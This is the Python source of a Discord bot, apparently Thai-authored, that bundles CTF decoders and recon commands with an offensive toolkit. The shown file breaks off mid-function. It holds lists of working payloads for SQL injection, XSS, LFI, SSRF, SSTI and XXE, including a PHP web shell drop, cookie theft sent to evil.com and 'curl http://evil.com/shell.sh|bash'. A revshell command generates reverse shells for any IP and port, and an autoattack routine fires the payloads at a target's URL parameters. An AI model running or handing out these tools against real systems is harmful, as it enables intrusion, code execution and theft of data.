import discord
from discord.ext import commands
import base64
import binascii
import datetime
import hashlib
import io
import os
import re
import shutil
import socket
import ssl
import string
import subprocess
import tempfile
import requests
from PIL import Image
from PIL.ExifTags import TAGS
import asyncio
from typing import Optional
from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse, quote



COMMON_DIRS = ["admin", "login", "config.php", ".env", ".git", "backup", "v1/api", "robots.txt"]

# --- [ 1. SETUP ] ---
intents = discord.Intents.default()
intents.message_content = True
intents.members = True

bot = commands.Bot(command_prefix='!', intents=intents, help_command=None)



TOKEN = os.getenv('DISCORD_TOKEN')
try:
    OWNER_ID = int(os.getenv('OWNER_ID'))
except:
    OWNER_ID = 0

# ตรวจสอบสิทธิ์เจ้าของบอท
def is_owner():
    async def predicate(ctx):
        return ctx.author.id == OWNER_ID
    return commands.check(predicate)


def command_exists(name):
    return shutil.which(name) is not None


def is_public_host(hostname: str) -> bool:
    hostname = hostname.lower().strip()
    if not hostname:
        return False
    if hostname in ('localhost', '127.0.0.1', '0.0.0.0'):
        return False
    if hostname.startswith(('10.', '172.', '192.168.', '169.254.')):
        return False
    if hostname.endswith('.local'):
        return False
    return True


def normalize_url(url: str) -> Optional[str]:
    if not url:
        return None
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    parsed = urlparse(url)
    if not parsed.scheme or not parsed.netloc:
        return None
    if not is_public_host(parsed.hostname or ''):
        return None
    safe_netloc = quote(parsed.netloc, safe=':@')
    safe_path = quote(parsed.path or '/', safe='/')
    return urlunparse((parsed.scheme, safe_netloc, safe_path, parsed.params, parsed.query, parsed.fragment))


def extract_strings_from_bytes(data, min_length=4):
    printable_bytes = set(bytes(string.printable, 'ascii'))
    current = bytearray()
    results = []

    for b in data:
        if b in printable_bytes:
            current.append(b)
        else:
            if len(current) >= min_length:
                results.append(current.decode('ascii', errors='ignore'))
            current.clear()

    if len(current) >= min_length:
        results.append(current.decode('ascii', errors='ignore'))

    return results

PAYLOAD_TEMPLATES = {
    'sqli': [
        "' OR '1'='1' -- ",
        '" OR ""="" -- ',
        "' OR 1=1 -- ",
        '1 OR 1=1',
        "' UNION SELECT NULL -- ",
        "' UNION SELECT database() -- ",
        "' UNION SELECT table_name FROM information_schema.tables -- ",
        "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users' -- ",
        "' UNION SELECT concat(username,':',password) FROM users -- ",
        "'; SELECT * FROM users -- ",
        "' AND SLEEP(5) -- ",
        "' AND IF(1=1, SLEEP(5), 0) -- ",
        "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 -- ",
        "' UNION SELECT LOAD_FILE('/etc/passwd') -- ",
        "' UNION SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/shell.php' -- "
    ],
    'xss': [
        '<script>alert(1)</script>',
        '"><script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg/onload=alert(1)>',
        '<iframe src="javascript:alert(1)"></iframe>',
        '<script>document.location="http://evil.com?c="+document.cookie</script>',
        '<img src=x onerror=eval(atob("YWxlcnQoMSk="))>',
        '<script>fetch("http://evil.com?c="+btoa(document.cookie))</script>',
        '<svg><script>alert(1)</script></svg>',
        '<details open ontoggle=alert(1)>',
        '<marquee onstart=alert(1)>',
        '<object data="javascript:alert(1)">',
        '<embed src="data:text/html,<script>alert(1)</script>">',
        '<form><input onfocus=alert(1) autofocus>',
        '<script>window.location="javascript:alert(1)"</script>'
    ],
    'lfi': [
        '../../../etc/passwd',
        '../../../../etc/passwd',
        '../../../../../etc/passwd',
        '/etc/passwd',
        '/proc/self/environ',
        'php://filter/convert.base64-encode/resource=index.php',
        'php://filter/read=convert.base64-encode/resource=config.php',
        'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+',
        'expect://whoami',
        'php://input',
        '/var/log/apache2/access.log',
        '/var/log/nginx/access.log',
        '/proc/self/cmdline',
        '/proc/self/fd/0',
        '/home/user/.ssh/id_rsa'
    ],
    'cmd': [
        '$(whoami)',
        '`whoami`',
        ';id',
        '&&id',
        '|id',
        ';cat /etc/passwd',
        '|cat /etc/passwd',
        '&&cat /etc/passwd',
        ';ls -la',
        '|ls -la',
        '&&ls -la',
        ';curl http://evil.com/shell.sh|bash',
        '|curl http://evil.com/shell.sh|bash',
        '&&curl http://evil.com/shell.sh|bash',
        ';wget http://evil.com/shell.sh -O- |bash',
        '|wget http://evil.com/shell.sh -O- |bash',
        '&&wget http://evil.com/shell.sh -O- |bash'
    ],
    'ssrf': [
        'http://127.0.0.1:80',
        'http://localhost:80',
        'http://0.0.0.0:80',
        'http://169.254.169.254/latest/meta-data/',
        'http://metadata.google.internal/computeMetadata/v1/',
        'http://169.254.169.254/latest/user-data/',
        'http://127.0.0.1:22',
        'http://localhost:22',
        'http://127.0.0.1:3306',
        'http://localhost:3306',
        'http://127.0.0.1:6379',
        'http://localhost:6379',
        'http://127.0.0.1:5432',
        'http://localhost:5432',
        'file:///etc/passwd',
        'file:///proc/self/environ',
        'dict://127.0.0.1:6379/info',
        'gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A1%0D%0A%244%0D%0Aquit%0D%0A'
    ],
    'rce': [
        ';phpinfo();',
        '|phpinfo()',
        '&&phpinfo()',
        ';system("id");',
        '|system("id")',
        '&&system("id")',
        ';exec("id");',
        '|exec("id")',
        '&&exec("id")',
        ';shell_exec("id");',
        '|shell_exec("id")',
        '&&shell_exec("id")',
        ';passthru("id");',
        '|passthru("id")',
        '&&passthru("id")',
        ';popen("id");',
        '|popen("id")',
        '&&popen("id")'
    ],
    'deserialization': [
        'O:8:"stdClass":0:{}',
        'a:2:{s:4:"test";s:4:"data";s:8:"function";s:4:"eval";}',
        'O:4:"Test":1:{s:4:"data";s:13:"system(\'id\');";}',
        'a:1:{i:0;O:15:"db_driver_mysql":1:{s:3:"sql";s:13:"system(\'id\');";}}',
        'O:8:"DateTime":1:{s:4:"date";s:25:"2023-01-01 00:00:00.000000";}',
        'C:8:"DateTime":25:{2023-01-01 00:00:00.000000}',
        'O:12:"DateInterval":1:{s:1:"y";i:1;}',
        'O:8:"stdClass":1:{s:5:"__PHP_Incomplete_Class_Name";O:8:"stdClass":0:{}}'
    ],
    'ssti': [
        '{{7*7}}',
        '{{config}}',
        '{{self.__dict__}}',
        '{{self.__class__.__bases__[0].__subclasses__()}}',
        '{{request.application.__globals__.__builtins__.__import__("os").popen("id").read()}}',
        '{{lipsum.__globals__.os.popen("id").read()}}',
        '{{cycler.__init__.__globals__.os.popen("id").read()}}',
        '{{namespace.__init__.__globals__.os.popen("id").read()}}',
        '{{joiner.__init__.__globals__.os.popen("id").read()}}',
        '{{namespace.__init__.__globals__.os.popen("id").read()}}',
        '{{joiner.__init__.__globals__.os.popen("id").read()}}',
        '{{namespace.__init__.__globals__.os.popen("id").read()}}',
        '{{joiner.__init__.__globals__.os.popen("id").read()}}',
        '{{namespace.__init__.__globals__.os.popen("id").read()}}',
        '{{joiner.__init__.__globals__.os.popen("id").read()}}'
    ],
    'xxe': [
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "http://evil.com">]><root>&test;</root>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">]><root>&test;</root>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://evil.com/evil.dtd">%remote;]><root>&test;</root>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "file:///etc/passwd">%remote;]><root>&test;</root>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+">]><root>&test;</root>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "expect://whoami">]><root>&test;</root>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "dict://127.0.0.1:6379/info">]><root>&test;</root>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A1%0D%0A%244%0D%0Aquit%0D%0A">]><root>&test;</root>'
    ]
}

SQLI_ERRORS = [
    'sql syntax', 'mysql_fetch', 'syntax error', 'unclosed quotation mark',
    'quoted string not properly terminated', 'odbc', 'sqlite', 'sqlstate'
]

LFI_SIGNATURES = ['root:', '/etc/passwd', 'document root', 'uid=']

# --- [ CUSTOM HELP COMMAND ] ---
@bot.command()
async def help(ctx):
    """แสดงรายการคำสั่งทั้งหมด"""
    embed = discord.Embed(
        title="🛡️ CyberBot Assistant - Command Menu",
        description="รายการคำสั่ง",
        color=0x00ff00 
    )

    # หมวด Crypto & Encoding
    embed.add_field(name="🧩 Crypto & Decoding", value=(
        "`!solve [text]` - ถอดรหัสอัตโนมัติ (B64, Hex, Caesar)\n"
        "`!ciphey [text]` - ใช้ AI ถอดรหัสขั้นสูง (ใช้เวลาคิดนาน)\n"
        "`!hash [hash]` - ตรวจสอบชนิดของ Hash (MD5, SHA1, SHA256)"
    ), inline=False)

    # หมวด Recon & OSINT
    embed.add_field(name="🔍 Recon & OSINT", value=(
        "`!scan [ip/domain]` - สแกนพอร์ต (Owner Only, หรือ fallback พอร์ตทั่วไป)\n"
        "`!loc [ip]` - ตรวจสอบที่ตั้งของ IP Address\n"
        "`!headers [url]` - ตรวจสอบ HTTP headers ของเว็บไซต์\n"
        "`!dir [url]` - สแกนหา Directory ที่ซ่อนอยู่ในเว็บ"
    ), inline=False)

    # หมวด File Analysis
    embed.add_field(name="📂 File Analysis", value=(
        "`!exif [attach file]` - สกัด Metadata จากรูปภาพ\n"
        "`!strings [attach file]` - ดึงข้อความที่อ่านออกได้จากไฟล์\n"
        "`!hashgen [text] [type]` - สร้าง hash MD5/SHA1/SHA256\n"
        "`!fileinfo [attach file]` - วิเคราะห์ประเภทไฟล์จาก magic bytes"
    ), inline=False)

    # หมวด Advanced Recon
    embed.add_field(name="🧭 Advanced Recon", value=(
        "`!subdomain [domain]` - ค้นหา subdomain พื้นฐาน\n"
        "`!portscan [target]` - สแกนพอร์ตที่พบบ่อย\n"
        "`!rdap [domain/ip]` - ดูข้อมูล RDAP แบบสรุป\n"
        "`!archive [url]` - ตรวจสอบสถานะใน Wayback Machine"
    ), inline=False)

    # หมวด Payload & Auto Attack
    embed.add_field(name="💣 Payload / Auto Attack", value=(
        "`!payload [type]` - สร้าง payload ขั้นสูง (sqli/xss/lfi/cmd/ssrf/rce/deserialization/ssti/xxe)\n"
        "`!autoattack [type] [url]` - ตรวจสอบโอกาสช่องโหว่โดยอัตโนมัติ (Owner only)\n"
        "`!fullscan [url]` - ตรวจสอบทุกประเภทช่องโหว่แบบครบถ้วน (Owner only)\n"
        "`!testpayload [type] [url]` - ทดสอบ payload จริงกับเป้าหมาย (Owner only)"
    ), inline=False)

    # หมวด Automated Tools
    embed.add_field(name="🤖 Automated Tools", value=(
        "`!recon [target]` - Pipeline อัตโนมัติ: subdomain + portscan + dir + headers + ssl (Owner only)\n"
        "`!autosolve [type] [input]` - แก้โจทย์ CTF อัตโนมัติ (crypto/web/encoding)\n"
        "`!monitor [url] [hours]` - ตรวจสอบเว็บเป็นระยะ และแจ้งเตือนเปลี่ยนแปลง (Owner only)\n"
        "`!stopmonitor` - หยุด monitoring (Owner only)"
    ), inline=False)

    # หมวด Offensive
    embed.add_field(name="⚔️ Offensive Tools", value=(
        "`!revshell [ip] [port]` - สร้างชุดคำสั่ง Reverse Shell"
    ), inline=False)

    # หมวด Utility
    embed.add_field(name="🛠️ Utility", value=(
        "`!ping` - ตรวจสอบสถานะบอท\n"
        "`!encode [type] [text]` - เข้ารหัส Base64/Hex\n"
        "`!decode [type] [text]` - ถอดรหัส Base64/Hex\n"
        "`!http [url]` - ตรวจสอบสถานะ HTTP ของเว็บไซต์\n"
        "`!sslcheck [url]` - ตรวจสอบใบรับรอง TLS\n"
        "`!dns [domain]` - ดู A/MX/NS ของโดเมน\n"
        "`!whois [domain/ip]` - ดูข้อมูล WHOIS"
    ), inline=False)

    embed.set_footer(text=f"Requested by {ctx.author.name}", icon_url=ctx.author.avatar.url if ctx.author.avatar else None)
    
    await ctx.send(embed=embed)

# --- [ 2. CRYPTO LOGIC ] ---
def smart_decode(text):
    results = []
    text = text.strip()
    
    # Hex
    if re.fullmatch(r'[0-9a-fA-F\s]+', text) and len(text) > 3:
        try:
            clean = text.replace(" ", "").replace("0x", "")
            decoded = binascii.unhexlify(clean).decode('utf-8')
            if decoded.isprintable(): results.append(f"🔢 **Hex:** `{decoded}`")
        except: pass

    # Base64
    if re.fullmatch(r'[A-Za-z0-9+/]+={0,2}', text) and len(text) % 4 == 0:
        try:
            decoded = base64.b64decode(text).decode('utf-8')
            if decoded.isprintable(): results.append(f"🔓 **Base64:** `{decoded}`")
        except: pass

    # Caesar Brute Force (Check for keywords)
    for shift in range(1, 26):
        candidate = "".join([chr((ord(c) - (65 if c.isupper() else 97) + shift) % 26 + (65 if c.isupper() else 97)) if c.isalpha() else c for c in text])
        if any(word in candidate.lower() for word in ["flag", "ctf", "{", "the", "admin"]):
            results.append(f"🏛️ **Caesar (Shift {26-shift}):** `{candidate}`")
    return results

# --- [ 3. COMMANDS ] ---

@bot.event
async def on_ready():
    print(f'🚀 บอท {bot.user.name} ออนไลน์แล้ว! (Owner ID: {OWNER_ID})')

@bot.command()
async def solve(ctx, *, text: str):
    """ถอดรหัสอัตโนมัติ (Base64, Hex, Caesar)"""
    res = smart_decode(text)
    if res:
        await ctx.send("🔎 **วิเคราะห์ความน่าจะเป็น:**\n" + "\n".join(res))
    else:
        await ctx.send("🧐 ไม่พบรูปแบบรหัสที่คุ้นเคยครับ")

@bot.command()
async def ciphey(ctx, *, text: str):
    """ใช้ AI แกะรหัสขั้นสูง (ทำงานแบบ Async ไม่บล็อกบอท)"""
    await ctx.send("🤖 **Ciphey:** กำลังให้ AI วิเคราะห์และแกะรหัส... (อาจใช้เวลาสักครู่)")
    
    try:
        
        process = await asyncio.create_subprocess_exec(
            'ciphey', '-t', text, '-q',
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.DEVNULL
        )

        
        stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=120.0)
        output = stdout.decode('utf-8').strip()
        
        if output:
            await ctx.send(f"🎉 **Ciphey ถอดรหัสสำเร็จ:**\n`{output}`")
        else:
            await ctx.send("🧐 Ciphey พยายามแล้วแต่ถอดรหัสไม่ออกครับ")
            
    except asyncio.TimeoutError:
        # ถ้าเกินเวลา 2 นาที ให้ฆ่า Process นั้นทิ้งเพื่อไม่ให้กิน RAM
        try:
            process.kill()
        except Exception:
            pass
        await ctx.send("⏱️ **Error:** รหัสมีความซับซ้อนเกินไป Ciphey ใช้เวลาคิดนานเกิน 2 นาที (Timeout)")
    except FileNotFoundError:
        await ctx.send("❌ ไม่พบคำสั่ง `ciphey` ในระบบ โปรดติดตั้ง Ciphey หรือรันบน Docker ที่มี Ciphey")
    except Exception as e:
        await ctx.send(f"❌ **Error:** เกิดข้อผิดพลาดในการรัน Ciphey: `{e}`")

@bot.command()
async def hash(ctx, hash_str: str):
    """ระบุชนิดของ Hash"""
    patterns = {"MD5": 32, "SHA-1": 40, "SHA-256": 64}
    found = [k for k, v in patterns.items() if len(hash_str) == v and re.match(r'^[a-fA-F0-9]+$', hash_str)]
    if found:
        await ctx.send(f"🔍 **Hash Type:** `{', '.join(found)}`")
    else:
        await ctx.send("❓ ไม่ทราบชนิด Hash หรือรูปแบบไม่ถูกต้อง")

@bot.command()
async def ping(ctx):
    """ตรวจสอบสถานะบอท"""
    await ctx.send(f"🏓 Pong! Latency: {round(bot.latency * 1000)}ms")

@bot.command()
async def headers(ctx, url: str):
    """ตรวจสอบ HTTP headers ของเว็บไซต์"""
    if not url.startswith("http"):
        url = "http://" + url
    try:
        r = requests.head(url, timeout=10, allow_redirects=True)
        lines = [f"{k}: {v}" for k, v in r.headers.items()]
        await ctx.send(f"📡 **Headers for {url}:**\n```\n{chr(10).join(lines[:20])}\n```")
    except Exception as e:
        await ctx.send(f"❌ ไม่สามารถดึง headers ได้: {e}")

@bot.command()
async def hashgen(ctx, text: str, hash_type: str = 'md5'):
    """สร้าง hash MD5/SHA1/SHA256"""
    hash_type = hash_type.lower()
    if hash_type not in ('md5', 'sha1', 'sha256'):
        return await ctx.send("❌ ต้องระบุประเภท hash เป็น md5, sha1 หรือ sha256")

    digest = hashlib.new(hash_type, text.encode('utf-8')).hexdigest()
    await ctx.send(f"🔐 **{hash_type.upper()}** ของ `{text}` คือ `{digest}`")

@bot.command()
async def encode(ctx, type: str, *, text: str):
    """เข้ารหัส Base64/Hex"""
    t = type.lower()
    if t == 'base64':
        encoded = base64.b64encode(text.encode('utf-8')).decode('utf-8')
    elif t == 'hex':
        encoded = binascii.hexlify(text.encode('utf-8')).decode('utf-8')
    else:
        return await ctx.send("❌ ป้อน type เป็น base64 หรือ hex เท่านั้น")
    await ctx.send(f"🧩 **Encode ({t}):** `{encoded}`")

@bot.command()
async def decode(ctx, type: str, *, text: str):
    """ถอดรหัส Base64/Hex"""
    t = type.lower()
    try:
        if t == 'base64':
            decoded = base64.b64decode(text).decode('utf-8')
        elif t == 'hex':
            decoded = binascii.unhexlify(text.replace(' ', '')).decode('utf-8')
        else:
            return await ctx.send("❌ ป้อน type เป็น base64 หรือ hex เท่านั้น")
        await ctx.send(f"🧩 **Decode ({t}):** `{decoded}`")
    except Exception as e:
        await ctx.send(f"❌ ไม่สามารถถอดรหัสได้: {e}")

@bot.command()
async def whois(ctx, query: str):
    """ดูข้อมูล WHOIS ของโดเมนหรือไอพี"""
    url = query
    if not re.match(r'^https?://', url):
        url = 'http://' + url
    if re.match(r'^(?:\d{1,3}\.){3}\d{1,3}$', query):
        rdap_url = f"https://rdap.org/ip/{query}"
    else:
        rdap_url = f"https://rdap.org/domain/{query}"

    try:
        r = requests.get(rdap_url, timeout=10)
        if r.status_code != 200:
            return await ctx.send(f"❌ ไม่สามารถดึงข้อมูล WHOIS ได้ (status {r.status_code})")

        data = r.json()
        lines = []
        if 'ldhName' in data:
            lines.append(f"Domain: {data.get('ldhName')}")
        if 'handle' in data:
            lines.append(f"Handle: {data.get('handle')}")
        if 'name' in data:
            lines.append(f"Name: {data.get('name')}")
        if 'country' in data:
            lines.append(f"Country: {data.get('country')}")
        if 'status' in data:
            lines.append(f"Status: {', '.join(data.get('status')) if isinstance(data.get('status'), list) else data.get('status')}")

        events = data.get('events', [])
        for event in events:
            if event.get('eventAction') in ('registration', 'registration date'):
                lines.append(f"Registered: {event.get('eventDate')}")
            elif event.get('eventAction') in ('expiration', 'expiration date'):
                lines.append(f"Expires: {event.get('eventDate')}")

        if not lines:
            lines.append('ไม่พบข้อมูล WHOIS ที่สามารถแสดงได้')

        await ctx.send("📜 **WHOIS:**\n```\n" + chr(10).join(lines[:20]) + "\n```")
    except Exception as e:
        await ctx.send(f"❌ ไม่สามารถดึงข้อมูล WHOIS ได้: {e}")

@bot.command()
async def dns(ctx, domain: str):
    """ดู A/MX/NS ของโดเมน"""
    try:
        answers = []
        for record_type in ('A', 'MX', 'NS'):
            r = requests.get('https://dns.google/resolve', params={'name': domain, 'type': record_type}, timeout=10)
            if r.status_code != 200:
                continue
            data = r.json()
            if 'Answer' in data:
                values = []
                for answer in data['Answer']:
                    values.append(answer.get('data'))
                answers.append(f"{record_type}: {', '.join(values)}")
        if not answers:
            return await ctx.send(f"❌ ไม่พบผล DNS สำหรับ {domain}")
        await ctx.send("🌐 **DNS " + domain + ":**\n```\n" + chr(10).join(answers) + "\n```")
    except Exception as e:
        await ctx.send(f"❌ ไม่สามารถดึงข้อมูล DNS ได้: {e}")

@bot.command()
async def http(ctx, url: str):
    """ตรวจสอบสถานะ HTTP ของเว็บไซต์"""
    if not url.startswith('http'):
        url = 'http://' + url
    try:
        r = requests.get(url, timeout=10, allow_redirects=True)
        lines = [
            f"Status: {r.status_code}",
            f"Content-Type: {r.headers.get('content-type', '-')}",
            f"Server: {r.headers.get('server', '-')}",
            f"Redirects: {len(r.history)}"
        ]
        preview = r.text[:400].replace('```', '``')
        await ctx.send("🌍 **HTTP " + url + ":**\n```\n" + chr(10).join(lines) + "\n```\n📄 **Body preview:**\n```\n" + preview + "\n```")
    except Exception as e:
        await ctx.send(f"❌ ไม่สามารถตรวจ HTTP ได้: {e}")

@bot.command()
async def sslcheck(ctx, url: str):
    """ตรวจสอบใบรับรอง TLS"""
    hostname = url.replace('https://', '').replace('http://', '').split('/')[0]
    try:
        context = ssl.create_default_context()
        with socket.create_connection((hostname, 443), timeout=10) as sock:
            with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                cert = ssock.getpeercert()
        not_after = datetime.datetime.strptime(cert['notAfter'], '%b %d %H:%M:%S %Y %Z')
        not_before = datetime.datetime.strptime(cert['notBefore'], '%b %d %H:%M:%S %Y %Z')
        days_left = (not_after - datetime.datetime.utcnow()).days
        issuer = ', '.join('='.join(item) for item in cert.get('issuer', [])[:2])
        subject = ', '.join('='.join(item) for item in cert.get('subject', [])[:2])
        await ctx.send("🔐 **SSL " + hostname + ":**\n```\n" +
                       f"Issuer: {issuer}\nSubject: {subject}\nValid from: {not_before}\nValid until: {not_after}\nDays left: {days_left}\n```")
    except Exception as e:
        await ctx.send(f"❌ ไม่สามารถตรวจสอบ SSL ได้: {e}")

@bot.command()
async def fileinfo(ctx):
    """วิเคราะห์ประเภทไฟล์จาก bytes magic"""
    if not ctx.message.attachments:
        return await ctx.send('📂 กรุณาอัปโหลดไฟล์เพื่อวิเคราะห์')
    for attachment in ctx.message.attachments:
        data = await attachment.read()
        kind = 'Unknown'
        if data.startswith(b'\x89PNG\r\n\x1a\n'):
            kind = 'PNG image'
        elif data.startswith(b'GIF87a') or data.startswith(b'GIF89a'):
            kind = 'GIF image'
        elif data.startswith(b'\xff\xd8\xff'):
            kind = 'JPEG image'
        elif data.startswith(b'%PDF-'):
            kind = 'PDF document'
        elif data.startswith(b'PK\x03\x04'):
            kind = 'ZIP archive'
        elif data.startswith(b'Rar!'):
            kind = 'RAR archive'
        elif data.startswith(b'MZ'):
            kind = 'Windows exe / PE'
        elif data.startswith(b'7z\xbc\xaf\x27\x1c'):
            kind = '7z archive'
        await ctx.send(f"📄 **FileInfo:** `{attachment.filename}` is `{kind}`")

@bot.command()
async def subdomain(ctx, domain: str):
    """ค้นหา subdomain พื้นฐาน"""
    subs = ['www', 'api', 'admin', 'dev', 'test', 'mail', 'vpn', 'portal', 'staging', 'beta']
    found = []
    for sub in subs:
        target = f"{sub}.{domain}"
        try:
            r = requests.get('https://dns.google/resolve', params={'name': target, 'type': 'A'}, timeout=5)
            if r.status_code == 200 and 'Answer' in r.json():
                answers = [a.get('data') for a in r.json().get('Answer', [])]
                found.append(f"{target}: {', '.join(answers)}")
        except Exception:
            pass

    if found:
        await ctx.send("🌐 **Subdomains Found:**\n```\n" + chr(10).join(found) + "\n```")
    else:
        await ctx.send(f"❌ ไม่พบ subdomain พื้นฐานสำหรับ {domain}")

@bot.command()
async def portscan(ctx, target: str):
    """สแกนพอร์ตที่พบบ่อย"""
    ports = [21, 22, 23, 25, 53, 80, 110, 139, 143, 161, 443, 445, 587, 8080, 8443, 3306, 3389]
    open_ports = []
    for port in ports:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.settimeout(1.5)
                if sock.connect_ex((target, port)) == 0:
                    open_ports.append(port)
        except Exception:
            pass

    if open_ports:
        await ctx.send(f"🔎 **Portscan {target}:** พบพอร์ตเปิด {', '.join(str(p) for p in open_ports)}")
    else:
        await ctx.send(f"❌ ไม่พบพอร์ตเปิดในรายการพอร์ตทั่วไปสำหรับ {target}")

@bot.command()
async def rdap(ctx, query: str):
    """ดูข้อมูล RDAP แบบสรุป"""
    endpoint = 'https://rdap.org/ip/' if re.match(r'^(?:\d{1,3}\.){3}\d{1,3}$', query) else 'https://rdap.org/domain/'
    try:
        r = requests.get(endpoint + query, timeout=10)
        if r.status_code != 200:
            return await ctx.send(f"❌ ไม่สามารถดึงข้อมูล RDAP ได้ (status {r.status_code})")
        data = r.json()
        summary = []
        if 'handle' in data:
            summary.append(f"Handle: {data.get('handle')}")
        if 'ldhName' in data:
            summary.append(f"Name: {data.get('ldhName')}")
        if 'country' in data:
            summary.append(f"Country: {data.get('country')}")
        if 'entities' in data:
            summary.append(f"Entities: {len(data.get('entities'))}")
        if 'events' in data:
            dates = []
            for event in data.get('events', []):
                dates.append(f"{event.get('eventAction')}: {event.get('eventDate')}")
            summary.extend(dates)
        if not summary:
            summary.append('ไม่พบข้อมูล RDAP ที่สามารถแสดงได้')
        await ctx.send("📘 **RDAP Summary:**\n```\n" + chr(10).join(summary[:20]) + "\n```")
    except Exception as e:
        await ctx.send(f"❌ ไม่สามารถดึงข้อมูล RDAP ได้: {e}")

@bot.command()
async def archive(ctx, url: str):
    """ตรวจสอบสถานะใน Wayback Machine"""
    if not url.startswith('http'):
        url = 'http://' + url
    try:
        r = requests.get('http://archive.org/wayback/available', params={'url': url}, timeout=10)
        data = r.json()
        snapshot = data.get('archived_snapshots', {}).get('closest')
        if snapshot:
            await ctx.send("🕰️ **Archive Found:**\n```\n" +
                           "URL: " + snapshot.get('url', 'N/A') + "\n" +
                           "Status: " + str(snapshot.get('status', 'N/A')) + "\n" +
                           "Timestamp: " + str(snapshot.get('timestamp', 'N/A')) + "\n```")
        else:
            await ctx.send(f"❌ ไม่พบ snapshot ใน Wayback Machine สำหรับ {url}")
    except Exception as e:
        await ctx.send(f"❌ ไม่สามารถตรวจสอบ archive ได้: {e}")

@bot.command()
@is_owner()
async def scan(ctx, target: str):
    """สแกนพอร์ตด้วย Nmap (เฉพาะเจ้าของบอท)"""
    await ctx.send(f"📡 กำลังเริ่มสแกน `{target}`... (กรุณารอสักครู่)")
    if command_exists('nmap'):
        try:
            output = subprocess.check_output(['nmap', '-F', target], timeout=60).decode('utf-8')
            result = output[:1900] + ("\n..." if len(output) > 1900 else "")
            await ctx.send(f"```text\n{result}```")
        except Exception as e:
            await ctx.send(f"❌ **Error:** `{str(e)}`")
    else:
        common_ports = [22, 80, 443, 8080, 3306, 3389]
        open_ports = []
        for port in common_ports:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                    sock.settimeout(2)
                    if sock.connect_ex((target, port)) == 0:
                        open_ports.append(port)
            except Exception:
                pass

        if open_ports:
            await ctx.send(f"✅ พบพอร์ตเปิดบน {target}: {', '.join(str(p) for p in open_ports)}")
        else:
            await ctx.send("❌ ไม่สามารถสแกนได้ เพราะ `nmap` ไม่ถูกติดตั้ง และไม่พบพอร์ตเปิดในรายการพอร์ตทั่วไป")

@bot.command()
async def revshell(ctx, ip: str, port: str):
    """สร้าง Reverse Shell Payloads"""
    bash = f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
    py = f"python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'"
    await ctx.send(f"🚀 **Payloads for {ip}:{port}**\n**Bash:**\n`{bash}`\n\n**Python:**\n`{py}`")


def format_payload_list(name):
    payloads = PAYLOAD_TEMPLATES.get(name.lower())
    if not payloads:
        return None
    return "\n".join(f"• `{payload}`" for payload in payloads)


def build_injection_urls(url, payloads):
    parsed = urlparse(url)
    query_items = parse_qsl(parsed.query, keep_blank_values=True)
    urls = []

    if query_items:
        for i, (key, _) in enumerate(query_items):
            for payload in payloads:
                copy_items = list(query_items)
                copy_items[i] = (key, payload)
                new_query = urlencode(copy_items, doseq=True)
                urls.append(urlunparse(parsed._replace(query=new_query)))
    else:
        for payload in payloads:
            new_query = urlencode({'q': payload})
            urls.append(urlunparse(parsed._replace(query=new_query)))

    return urls


def scan_autoattack(url, payloads, validator):
    results = []
    for candidate in build_injection_urls(url, payloads):
        try:
            r = requests.get(candidate, timeout=10, allow_redirects=True)
            if validator(r.text):
                results.append((candidate, r.status_code))
        except Exception:
            pass
        if len(results) >= 5:
            break
    return results


@bot.command()
async def payload(ctx, payload_type: str):
    """สร้าง payload สำหรับ SQLi/XSS/LFI/command"""
    payload_type = payload_type.lower()
    payload_text = format_payload_list(payload_type)
    if not payload_text:
        return await ctx.send("❌ ประเภท payload ต้องเป็น sqli, xss, lfi หรือ cmd")
    await ctx.send(f"💥 **Payload {payload_type.upper()}:**\n{payload_text}")


@bot.command()
@is_owner()
async def autoattack(ctx, attack_type: str, url: str):
    """ตรวจสอบโอกาสช่องโหว่โดยอัตโนมัติ (sqli/xss/lfi/ssrf/rce)"""
    attack_type = attack_type.lower()
    if attack_type not in ['sqli', 'xss', 'lfi', 'ssrf', 'rce']:
        return await ctx.send("❌ ประเภท attack ต้องเป็น sqli, xss, lfi, ssrf หรือ rce")

    normalized_url = normalize_url(url)
    if not normalized_url:
        return await ctx.send("⚠️ URL หรือ host ไม่ปลอดภัย กรุณาใส่ URL สาธารณะที่ถูกต้อง")
    url = normalized_url

    await ctx.send(f"⚡ กำลังทดสอบ {attack_type.upper()} บน {url} ...")

    def sqli_validator(text):
        lower_text = text.lower()
        return any(err in lower_text for err in SQLI_ERRORS)

    def xss_validator(text):
